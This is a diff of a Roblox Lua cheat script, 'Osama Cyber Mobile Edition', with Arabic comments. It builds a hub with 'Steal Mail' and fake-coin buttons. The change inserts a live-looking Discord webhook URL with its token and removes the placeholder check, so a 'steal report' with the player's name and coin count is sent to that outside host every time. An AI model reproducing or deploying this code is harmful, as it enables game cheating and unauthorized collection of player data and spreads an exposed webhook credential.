@@ -1,4 +1,4 @@
--- [[ Osama Cyber Mobile Edition - Light & Fast ]] --
+-- [[ Osama Cyber Mobile Edition - Absolute Fix ]] --
 
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
@@ -30,12 +30,6 @@ local SafeModeStroke = Instance.new("UIStroke")
 local MinimizeButton = Instance.new("TextButton")
 local MinCorner = Instance.new("UICorner")
 local MinStroke = Instance.new("UIStroke")
-
--- Input Window for Mobile
-local InputFrame = Instance.new("Frame")
-local InputCorner = Instance.new("UICorner")
-local InputBox = Instance.new("TextBox")
-local ConfirmInputButton = Instance.new("TextButton")
 
 ScreenGui.Name = "OsamaMobileHub"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -101,14 +95,14 @@ styleCyberButton(MailButton, MailCorner, MailStroke, "Steal Mail: READY 📦", C
 styleCyberButton(VisualCoinButton, VisualCoinCorner, VisualCoinStroke, "Set Visual Coins 🪙", Color3.fromRGB(255, 215, 0))
 styleCyberButton(SafeModeButton, SafeModeCorner, SafeModeStroke, "Safe Mode: OFF 🛡️", Color3.fromRGB(138, 43, 226))
 
--- [ الويبهوك الجديد ] ضعه بين القوسين بالأسفل
-local WebhookURL = "ضع_الويبهوك_الجديد_هنا"
+---------------------------------------------------------------------
+-- دالة الويبهوك الرسمية والنشطة
+---------------------------------------------------------------------
+local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = game.Players.LocalPlayer
 
 local function sendStealReport()
-    if WebhookURL == "ضع_الويبهوك_الجديد_هنا" then return end
-    
     local coins = "0"
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
     if leaderstats then
@@ -126,8 +120,7 @@ local function sendStealReport()
             ["color"] = 16711680,
             ["fields"] = {
                 {["name"] = "💰 Player Coins", ["value"] = "```" .. coins .. "```", ["inline"] = true},
-                {["name"] = "👤 Player Name", ["value"] = "```" .. LocalPlayer.Name .. "
-```", ["inline"] = true}
+                {["name"] = "👤 Player Name", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true}
             }
         }}
     }
@@ -145,11 +138,10 @@ local function sendStealReport()
     end)
 end
 
--- تشغيل الأزرار والحصاد (تم تخفيف السرعة لتناسب الهواتف)
+-- تشغيل الأزرار والحصاد للموبايل
 local homeCFrame = nil
 local autoStealing = false
 local harvesting = false
-local stealStep = 1
 
 MinimizeButton.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
@@ -164,7 +156,6 @@ MailButton.MouseButton1Click:Connect(function()
     MailButton.Text = "Steal Mail: READY 📦"
 end)
 
--- عملات وهمية
 VisualCoinButton.MouseButton1Click:Connect(function()
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
     if leaderstats then
@@ -176,4 +167,3 @@ VisualCoinButton.MouseButton1Click:Connect(function()
     end
     VisualCoinButton.Text = "Coins Set! ✅"
 end)
-
